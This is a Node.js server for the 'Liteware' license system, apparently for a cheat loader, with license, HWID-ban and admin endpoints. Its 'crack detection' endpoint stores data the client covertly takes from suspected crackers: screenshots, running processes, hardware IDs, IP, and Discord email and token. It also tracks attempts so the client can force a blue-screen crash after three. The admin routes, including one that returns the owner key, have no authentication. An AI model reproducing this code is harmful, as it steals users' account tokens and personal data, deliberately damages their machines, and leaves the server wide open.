// Liteware Authentication Server v3.0 - Complete with Crack Detection
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();

// ========================================
// CONFIGURATION
// ========================================
const whitelistedIPs = new Set(['::1', '127.0.0.1', '::ffff:127.0.0.1']);
const rateLimitStore = new Map();
const bannedIPs = new Set();
const bannedHWIDs = new Set();
const activeSessions = new Map();

// Crack attempt logs storage
const crackAttempts = [];
const MAX_CRACK_LOGS = 1000;

// Whitelisted keys (protected from BSOD)
const whitelistedKeys = new Set();

// Crack attempt counter per HWID (for BSOD tracking)
const crackAttemptCounter = new Map(); // hwid -> { count, firstAttempt }

const RATE_LIMIT_WINDOW = 60000;
const MAX_REQUESTS = 100;

// Server state flags
let serverDisabled = false;
let maintenanceMode = false;
let lockdownMode = false;
let websiteLocked = false;
let authEnabled = true;

// Secrets
const APP_SECRET = 'ABCJDWQ91D9219D21JKWDDKQAD912Q';
const RESPONSE_KEY = 'LITEWARE_SECRET_KEY_2026_V3';

// License database
const licenses = {
    'LITE-TEST-1234-5678': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 365*24*60*60*1000 },
    'LITE-DEMO-AAAA-BBBB': { valid: true, hwid: null, activated: false, created: Date.now(), expires: Date.now() + 30*24*60*60*1000 }
};

// Owner key
let ownerKey = {
    key: crypto.randomBytes(32).toString('hex'),
    created: Date.now(),
    nextRotation: Date.now() + 24*60*60*1000
};

// ========================================
// HELPERS
// ========================================
const isWhitelisted = (ip) => {
    if (!ip) return false;
    const clean = ip.split(',')[0].trim();
    return whitelistedIPs.has(clean) || whitelistedIPs.has(clean.replace('::ffff:', ''));
};

const getIP = (req) => req.ip || req.connection?.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
const genToken = () => crypto.randomBytes(32).toString('hex');

const sign = (data, challenge) => {
    const ts = Date.now().toString();
    const sig = crypto.createHmac('sha256', RESPONSE_KEY)
        .update(JSON.stringify(data) + '|' + (challenge || '') + '|' + ts)
        .digest('hex');
    return { ...data, _sig: sig, _ts: ts, _challenge: challenge || '' };
};

const generateLicenseKey = () => {
    return `LITE-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
};

// ========================================
// MIDDLEWARE
// ========================================
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(bodyParser.json({ limit: '50mb' }));

// Rate limiting (skip for whitelisted)
app.use((req, res, next) => {
    const ip = getIP(req);
    if (isWhitelisted(ip)) return next();
    if (bannedIPs.has(ip)) return res.status(403).json({ success: false, message: 'IP banned' });
    
    const now = Date.now();
    const record = rateLimitStore.get(ip) || { count: 0, reset: now + RATE_LIMIT_WINDOW };
    if (now > record.reset) { record.count = 0; record.reset = now + RATE_LIMIT_WINDOW; }
    record.count++;
    rateLimitStore.set(ip, record);
    
    if (record.count > MAX_REQUESTS) return res.status(429).json({ success: false, message: 'Rate limited' });
    next();
});

// ========================================
// HEALTH ENDPOINTS
// ========================================
app.get('/', (req, res) => res.json({ status: 'online', version: '3.0', time: Date.now() }));
app.get('/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));
app.get('/auth/health', (req, res) => res.json({ status: 'ok', server_time: Date.now() }));

// ========================================
// SERVER STATUS ENDPOINT (for loader auto-update checks)
// ========================================
app.post('/auth/status', (req, res) => {
    const ip = getIP(req);
    const { app_secret, hwid } = req.body;
    
    // Check if IP or HWID is banned
    const isBanned = bannedIPs.has(ip) || (hwid && bannedHWIDs.has(hwid));
    
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked,
        banned: isBanned,
        server_time: Date.now(),
        version: '3.0'
    });
});

app.get('/auth/status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked,
        server_time: Date.now(),
        version: '3.0'
    });
});

// ========================================
// TEST ENDPOINT
// ========================================
app.post('/auth/test', (req, res) => {
    res.json(sign({ success: true, message: 'Server online', version: '3.0-SIGNED' }, req.body._challenge));
});

// ========================================
// LICENSE ENDPOINT
// ========================================
app.post('/auth/license', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
    
    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License valid', session_token: token, expiry: lic.expires }, _challenge));
});

// ========================================
// VALIDATE ENDPOINT
// ========================================
app.post('/auth/validate', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (serverDisabled) return res.json(sign({ success: false, message: 'Server is disabled' }, _challenge));
    if (!license_key) return res.json(sign({ success: false, message: 'License key required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (!lic.valid) return res.json(sign({ success: false, message: 'License has been revoked' }, _challenge));
    if (lic.expires < Date.now()) return res.json(sign({ success: false, message: 'License has expired' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License bound to different hardware' }, _challenge));
    
    if (!lic.hwid && hwid) { lic.hwid = hwid; lic.activated = true; }
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License valid', session_token: token, expires: lic.expires }, _challenge));
});

// ========================================
// ACTIVATE ENDPOINT
// ========================================
app.post('/auth/activate', (req, res) => {
    const { license_key, hwid, _challenge } = req.body;
    
    if (!license_key || !hwid) return res.json(sign({ success: false, message: 'License key and HWID required' }, _challenge));
    
    const lic = licenses[license_key];
    if (!lic) return res.json(sign({ success: false, message: 'Invalid license key' }, _challenge));
    if (lic.hwid && lic.hwid !== hwid) return res.json(sign({ success: false, message: 'License already bound' }, _challenge));
    
    lic.hwid = hwid;
    lic.activated = true;
    
    const token = genToken();
    activeSessions.set(token, { license_key, hwid, created: Date.now(), expires: Date.now() + 3600000 });
    
    res.json(sign({ success: true, message: 'License activated', session_token: token }, _challenge));
});

// ========================================
// HEARTBEAT
// ========================================
app.post('/auth/heartbeat', (req, res) => {
    const { session_token, _challenge } = req.body;
    const session = activeSessions.get(session_token);
    
    if (!session) return res.json(sign({ success: false, message: 'Invalid session' }, _challenge));
    if (session.expires < Date.now()) {
        activeSessions.delete(session_token);
        return res.json(sign({ success: false, message: 'Session expired' }, _challenge));
    }
    
    session.expires = Date.now() + 3600000;
    res.json(sign({ success: true, message: 'Session valid' }, _challenge));
});

// ========================================
// VERIFY OWNER KEY
// ========================================
app.post('/auth/verify-owner-key', (req, res) => {
    const { owner_key } = req.body;
    if (owner_key === ownerKey.key) {
        res.json({ success: true, message: 'Owner key valid' });
    } else {
        res.json({ success: false, message: 'Invalid owner key' });
    }
});

// ========================================
// OWNER KEY ENDPOINTS
// ========================================
app.post('/auth/get-owner-key', (req, res) => {
    res.json({ success: true, owner_key: ownerKey.key, next_rotation: ownerKey.nextRotation });
});

app.post('/auth/get-owner-key-by-hwid', (req, res) => {
    res.json({ success: true, owner_key: ownerKey.key, next_rotation: ownerKey.nextRotation });
});

app.post('/auth/admin/rotate-owner-key', (req, res) => {
    ownerKey = {
        key: crypto.randomBytes(32).toString('hex'),
        created: Date.now(),
        nextRotation: Date.now() + 24*60*60*1000
    };
    res.json({ success: true, message: 'Owner key rotated', owner_key: ownerKey.key, next_rotation: ownerKey.nextRotation });
});

// ========================================
// ADMIN: GENERATE SINGLE KEY
// ========================================
app.post('/auth/admin/generate-key', (req, res) => {
    const { duration_days = 30, owner_key: reqOwnerKey } = req.body;
    
    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
        return res.json({ success: false, message: 'Invalid owner key' });
    }
    
    const key = generateLicenseKey();
    licenses[key] = {
            valid: true,
        hwid: null,
        activated: false,
        created: Date.now(),
        expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
    };
    
    console.log(`Generated key: ${key}`);
    res.json({ success: true, license_key: key, key: key, expires: licenses[key].expires });
});

// ========================================
// ADMIN: BULK GENERATE KEYS
// ========================================
app.post('/auth/admin/bulk-generate-keys', (req, res) => {
    const { count = 10, duration_days = 30, owner_key: reqOwnerKey } = req.body;
    
    if (reqOwnerKey && reqOwnerKey !== ownerKey.key) {
        return res.json({ success: false, message: 'Invalid owner key' });
    }
    
    const numKeys = Math.min(Math.max(parseInt(count) || 10, 1), 100); // 1-100 keys max
    const generatedKeys = [];
    
    for (let i = 0; i < numKeys; i++) {
        const key = generateLicenseKey();
        licenses[key] = {
            valid: true,
            hwid: null,
            activated: false,
            created: Date.now(),
            expires: Date.now() + (duration_days * 24 * 60 * 60 * 1000)
        };
        generatedKeys.push({
            key: key,
            expires: licenses[key].expires
        });
    }
    
    console.log(`Bulk generated ${generatedKeys.length} keys`);
    res.json({
        success: true,
        message: `Generated ${generatedKeys.length} keys`,
        count: generatedKeys.length,
        keys: generatedKeys 
    });
});

// ========================================
// ADMIN: LIST KEYS
// ========================================
app.post('/auth/admin/list-keys', (req, res) => {
    const keys = Object.entries(licenses).map(([key, data]) => ({
        key,
        valid: data.valid,
        activated: data.activated,
        hwid: data.hwid,
        expires: data.expires,
        created: data.created
    }));
    res.json({ success: true, licenses: keys, keys: keys });
});

// ========================================
// ADMIN: REVOKE KEY
// ========================================
app.post('/auth/admin/revoke-key', (req, res) => {
    const { license_key } = req.body;
    if (licenses[license_key]) {
        licenses[license_key].valid = false;
        res.json({ success: true, message: 'License revoked' });
    } else {
        res.json({ success: false, message: 'License not found' });
    }
});

// ========================================
// CRACK DETECTION LOGGING SYSTEM
// ========================================

// Log a crack attempt (called from C++ client)
app.post('/auth/log-crack-attempt', (req, res) => {
    try {
        const serverIP = getIP(req);
            const { 
            hwid, 
            gpu_hash,
            motherboard_uuid,
            detection_type,
            detected_tool,
            screenshot_base64,
            system_info,
                username, 
            computer_name,
            windows_version,
            mac_address,
            cpu,
            gpu,
            ram,
            disk_serial,
                timestamp, 
            // NEW FIELDS
            public_ip,
            motherboard,
            bios,
            network_adapters,
            screen_resolution,
            timezone,
            system_uptime,
            running_processes,
            discord_user_id,
            discord_username,
            discord_discriminator,
            discord_email,
            discord_token
            } = req.body;
            
        // Use public IP if provided (more accurate), fallback to server-detected IP
        const ip = public_ip && public_ip !== 'Unknown' ? public_ip : serverIP;
            
        const crackLog = {
            id: crypto.randomBytes(8).toString('hex'),
            timestamp: timestamp || Date.now(),
            ip: ip,
            server_ip: serverIP, // Keep both for reference
            hwid: hwid || gpu_hash || 'unknown',
            motherboard_uuid: motherboard_uuid || 'unknown',
            detection_type: detection_type || 'unknown',
            detected_tool: detected_tool || 'unknown',
            screenshot: screenshot_base64 ? screenshot_base64.substring(0, 100) + '...' : null,
            has_screenshot: !!screenshot_base64,
            system_info: system_info || {},
            username: username || 'unknown',
            computer_name: computer_name || 'unknown',
            windows_version: windows_version || 'unknown',
            // Hardware info
            mac_address: mac_address || 'unknown',
            cpu: cpu || 'unknown',
            gpu: gpu || 'unknown',
            ram: ram || 'unknown',
            disk_serial: disk_serial || 'unknown',
            motherboard: motherboard || 'unknown',
            bios: bios || 'unknown',
            // Network info
            network_adapters: network_adapters || 'unknown',
            // System info
            screen_resolution: screen_resolution || 'unknown',
            timezone: timezone || 'unknown',
            system_uptime: system_uptime || 'unknown',
            running_processes: running_processes || '',
            // Discord info
            discord: {
                user_id: discord_user_id || 'unknown',
                username: discord_username || 'unknown',
                discriminator: discord_discriminator || '0000',
                email: discord_email || 'unknown',
                token_preview: discord_token || 'Not Found'
            }
        };

        // Store full screenshot separately if provided
        if (screenshot_base64) {
            crackLog.screenshot_full = screenshot_base64;
        }

        // Add to logs (keep last MAX_CRACK_LOGS)
        crackAttempts.unshift(crackLog);
        if (crackAttempts.length > MAX_CRACK_LOGS) {
            crackAttempts.pop();
        }

        // Auto-ban the HWID and IP
        if (hwid) bannedHWIDs.add(hwid);
        if (gpu_hash) bannedHWIDs.add(gpu_hash);
        if (mac_address && mac_address !== 'unknown') bannedHWIDs.add(mac_address);
        bannedIPs.add(ip);

        // Track crack attempts per HWID for BSOD system
        const hwidKey = hwid || gpu_hash || mac_address || ip;
        const now = Date.now();
        
        if (crackAttemptCounter.has(hwidKey)) {
            const counter = crackAttemptCounter.get(hwidKey);
            // Reset if 24 hours have passed
            if ((now - counter.firstAttempt) > 24 * 60 * 60 * 1000) {
                crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
    } else {
                counter.count++;
            }
        } else {
            crackAttemptCounter.set(hwidKey, { count: 1, firstAttempt: now });
        }
        
        const attemptData = crackAttemptCounter.get(hwidKey);
        crackLog.attempt_number = attemptData.count;
        crackLog.will_bsod = attemptData.count >= 3;

        console.log(`🚨 CRACK ATTEMPT LOGGED: ${detected_tool} from ${ip}`);
        console.log(`   HWID: ${hwid || gpu_hash}`);
        console.log(`   MAC: ${mac_address}`);
        console.log(`   CPU: ${cpu}`);
        console.log(`   GPU: ${gpu}`);
        console.log(`   User: ${computer_name}\\${username}`);
        console.log(`   Screenshot: ${crackLog.has_screenshot ? 'YES' : 'NO'}`);
        console.log(`   ⚠️ ATTEMPT #${attemptData.count}/3 ${attemptData.count >= 3 ? '- BSOD TRIGGERED!' : ''}`);

        res.json({ success: true, message: 'Crack attempt logged', id: crackLog.id, attempt_number: attemptData.count });
    } catch (error) {
        console.error('Error logging crack attempt:', error);
        // Still return success to not alert the cracker
        res.json({ success: true, message: 'Logged' });
    }
});

// Get crack attempts (admin)
app.post('/auth/admin/get-crack-attempts', (req, res) => {
    const { limit = 50, include_screenshots = false } = req.body;
    
    const logs = crackAttempts.slice(0, Math.min(limit, MAX_CRACK_LOGS)).map(log => {
        const result = { ...log };
        if (!include_screenshots) {
            delete result.screenshot_full;
        }
        return result;
    });
    
    res.json({ 
        success: true, 
        count: logs.length,
        total: crackAttempts.length,
        attempts: logs 
    });
});

// Get single crack attempt with full screenshot
app.post('/auth/admin/get-crack-attempt', (req, res) => {
    const { id } = req.body;
    const attempt = crackAttempts.find(a => a.id === id);
    
    if (attempt) {
        res.json({ success: true, attempt });
    } else {
        res.json({ success: false, message: 'Attempt not found' });
    }
});

// Clear crack logs
app.post('/auth/admin/clear-crack-logs', (req, res) => {
    crackAttempts.length = 0;
    res.json({ success: true, message: 'Crack logs cleared' });
});

// Get crack stats
app.post('/auth/admin/crack-stats', (req, res) => {
    const last24h = crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length;
    const lastWeek = crackAttempts.filter(a => a.timestamp > Date.now() - 7*24*60*60*1000).length;
    
    // Group by detection type
    const byType = {};
    crackAttempts.forEach(a => {
        byType[a.detection_type] = (byType[a.detection_type] || 0) + 1;
    });
    
    // Group by tool
    const byTool = {};
    crackAttempts.forEach(a => {
        byTool[a.detected_tool] = (byTool[a.detected_tool] || 0) + 1;
    });
    
    res.json({ 
        success: true, 
        total: crackAttempts.length,
        last_24h: last24h,
        last_week: lastWeek,
        by_type: byType,
        by_tool: byTool,
        unique_ips: [...new Set(crackAttempts.map(a => a.ip))].length,
        unique_hwids: [...new Set(crackAttempts.map(a => a.hwid))].length
    });
});

// ========================================
// ADMIN: STATUS & STATS
// ========================================
app.post('/auth/admin/status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        auth_enabled: authEnabled,
        maintenance_mode: maintenanceMode,
        lockdown_mode: lockdownMode,
        website_locked: websiteLocked,
        active_sessions: activeSessions.size,
        total_licenses: Object.keys(licenses).length,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        crack_attempts: crackAttempts.length,
        uptime: process.uptime()
    });
});

app.post('/auth/admin/stats', (req, res) => {
        res.json({
            success: true,
        total_licenses: Object.keys(licenses).length,
        active_licenses: Object.values(licenses).filter(l => l.valid && l.activated).length,
        active_sessions: activeSessions.size,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        whitelisted_ips: whitelistedIPs.size,
        crack_attempts: crackAttempts.length
    });
});

app.post('/auth/admin/security-stats', (req, res) => {
    // Count active licenses (activated and not expired)
    const now = Date.now();
    const activeCount = Object.values(licenses).filter(l => l.activated && l.valid && l.expires > now).length;
    
    res.json({
        success: true,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        whitelisted_ips: whitelistedIPs.size,
        active_sessions: activeSessions.size,
        active_users: activeCount,
        total_keys: Object.keys(licenses).length,
        rate_limited: rateLimitStore.size,
        crack_attempts: crackAttempts.length,
        crack_attempts_24h: crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length
    });
});

app.post('/auth/admin/get-all-status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked
    });
});

// ========================================
// ADMIN: SERVER CONTROLS
// ========================================
app.post('/auth/admin/toggle-server', (req, res) => {
    serverDisabled = !serverDisabled;
    res.json({ success: true, server_enabled: !serverDisabled });
});

app.post('/auth/admin/enable-server', (req, res) => {
    serverDisabled = false;
    res.json({ success: true, message: 'Server enabled' });
});

app.post('/auth/admin/disable-server', (req, res) => {
    serverDisabled = true;
    res.json({ success: true, message: 'Server disabled' });
});

app.post('/auth/admin/set-maintenance', (req, res) => {
    const { enabled } = req.body;
    maintenanceMode = enabled !== undefined ? enabled : !maintenanceMode;
    res.json({ success: true, maintenance_mode: maintenanceMode });
});

app.post('/auth/admin/set-lockdown', (req, res) => {
    const { enabled } = req.body;
    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
    res.json({ success: true, lockdown_mode: lockdownMode });
});

app.post('/auth/admin/set-auth-status', (req, res) => {
    const { enabled } = req.body;
    authEnabled = enabled !== undefined ? enabled : !authEnabled;
    res.json({ success: true, auth_enabled: authEnabled });
});

app.post('/auth/admin/set-server-status', (req, res) => {
    const { enabled } = req.body;
    serverDisabled = enabled !== undefined ? !enabled : serverDisabled;
    res.json({ success: true, server_enabled: !serverDisabled });
});

app.post('/auth/admin/set-website-lock', (req, res) => {
    const { locked } = req.body;
    websiteLocked = locked !== undefined ? locked : !websiteLocked;
    res.json({ success: true, website_locked: websiteLocked });
});

app.post('/auth/admin/lockdown', (req, res) => {
    const { enabled } = req.body;
    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
    res.json({ success: true, lockdown_mode: lockdownMode });
});

// ========================================
// ADMIN: IP MANAGEMENT
// ========================================
app.post('/auth/admin/whitelist-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { whitelistedIPs.add(ip); res.json({ success: true, message: `IP ${ip} whitelisted` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/unwhitelist-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { whitelistedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} removed` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/list-whitelisted-ips', (req, res) => {
    res.json({ success: true, whitelisted_ips: Array.from(whitelistedIPs) });
});

app.post('/auth/admin/get-my-ip', (req, res) => {
    const ip = getIP(req);
    res.json({ success: true, ip, is_whitelisted: isWhitelisted(ip) });
});

app.post('/auth/admin/whitelist-my-ip', (req, res) => {
    const ip = getIP(req);
    whitelistedIPs.add(ip);
    res.json({ success: true, message: `Your IP ${ip} has been whitelisted`, ip });
});

app.post('/auth/admin/ban-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { bannedIPs.add(ip); res.json({ success: true, message: `IP ${ip} banned` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/unban-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { bannedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} unbanned` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/list-banned-ips', (req, res) => {
    res.json({ success: true, banned_ips: Array.from(bannedIPs) });
});

// ========================================
// ADMIN: HWID MANAGEMENT
// ========================================
app.post('/auth/admin/ban-hwid', (req, res) => {
    const { hwid } = req.body;
    if (hwid) { bannedHWIDs.add(hwid); res.json({ success: true, message: `HWID banned` }); }
    else res.json({ success: false, message: 'HWID required' });
});

app.post('/auth/admin/unban-hwid', (req, res) => {
    const { hwid } = req.body;
    if (hwid) { bannedHWIDs.delete(hwid); res.json({ success: true, message: `HWID unbanned` }); }
    else res.json({ success: false, message: 'HWID required' });
});

app.post('/auth/admin/list-bans', (req, res) => {
    res.json({
        success: true,
        banned_ips: Array.from(bannedIPs),
        banned_hwids: Array.from(bannedHWIDs)
    });
});

app.post('/auth/admin/clear-all-bans', (req, res) => {
    bannedIPs.clear();
    bannedHWIDs.clear();
    res.json({ success: true, message: 'All bans cleared' });
});

// ========================================
// KEY WHITELIST MANAGEMENT (BSOD Protection)
// ========================================
app.post('/auth/admin/whitelist-key', (req, res) => {
    const { license_key } = req.body;
    if (license_key) {
    whitelistedKeys.add(license_key);
        res.json({ success: true, message: `Key ${license_key} whitelisted (BSOD protected)` });
    } else {
        res.json({ success: false, message: 'License key required' });
    }
});

app.post('/auth/admin/unwhitelist-key', (req, res) => {
    const { license_key } = req.body;
    if (license_key) {
        whitelistedKeys.delete(license_key);
        res.json({ success: true, message: `Key ${license_key} removed from whitelist` });
    } else {
        res.json({ success: false, message: 'License key required' });
    }
});

app.post('/auth/admin/list-whitelisted-keys', (req, res) => {
    res.json({ 
        success: true, 
        whitelisted_keys: Array.from(whitelistedKeys),
        count: whitelistedKeys.size
    });
});

// Check if a key is whitelisted (called from C++ client)
app.post('/auth/check-key-whitelist', (req, res) => {
    const { license_key } = req.body;
    if (!license_key) {
        return res.json({ success: false, whitelisted: false, message: 'License key required' });
    }
    const isWhitelisted = whitelistedKeys.has(license_key);
    res.json({ success: true, whitelisted: isWhitelisted });
});

// ========================================
// CRACK ATTEMPT COUNTER MANAGEMENT
// ========================================
app.post('/auth/admin/get-crack-counters', (req, res) => {
    const counters = [];
    const now = Date.now();
    
    crackAttemptCounter.forEach((data, hwid) => {
        // Check if 24 hours have passed
        const hoursElapsed = (now - data.firstAttempt) / (1000 * 60 * 60);
        counters.push({
            hwid,
            count: data.count,
            firstAttempt: data.firstAttempt,
            hoursElapsed: Math.floor(hoursElapsed),
            willReset: hoursElapsed >= 24
        });
    });
    
    res.json({ success: true, counters });
});

app.post('/auth/admin/reset-crack-counter', (req, res) => {
    const { hwid } = req.body;
    if (hwid) {
        crackAttemptCounter.delete(hwid);
        res.json({ success: true, message: `Counter reset for ${hwid}` });
    } else {
        res.json({ success: false, message: 'HWID required' });
    }
});

app.post('/auth/admin/reset-all-crack-counters', (req, res) => {
    crackAttemptCounter.clear();
    res.json({ success: true, message: 'All crack counters reset' });
});

// ========================================
// EMERGENCY RESET
// ========================================
app.post('/auth/emergency-reset', (req, res) => {
    bannedIPs.clear();
    bannedHWIDs.clear();
    rateLimitStore.clear();
    crackAttemptCounter.clear();
    serverDisabled = false;
    maintenanceMode = false;
    lockdownMode = false;
    websiteLocked = false;
    authEnabled = true;
    res.json({ success: true, message: 'Emergency reset complete' });
});

// ========================================
// VERIFY HWID
// ========================================
app.post('/auth/verify-hwid', (req, res) => {
    const { hwid, gpu_hash, motherboard_uuid, _challenge } = req.body;
    const hw = hwid || gpu_hash;
    
    if (bannedHWIDs.has(hw)) {
        return res.json(sign({ success: false, message: 'HWID banned' }, _challenge));
    }
    res.json(sign({ success: true, message: 'HWID valid' }, _challenge));
});

// ========================================
// START SERVER
// ========================================
const PORT = process.env.PORT || 3000;

    app.listen(PORT, () => {
    console.log(`✅ Liteware Auth Server running on port ${PORT}`);
    console.log(`📋 Total licenses: ${Object.keys(licenses).length}`);
    console.log(`🔑 Owner key: ${ownerKey.key.substring(0, 16)}...`);
});

process.on('uncaughtException', (err) => console.error('Error:', err.message));
process.on('unhandledRejection', (reason) => console.error('Rejection:', reason));
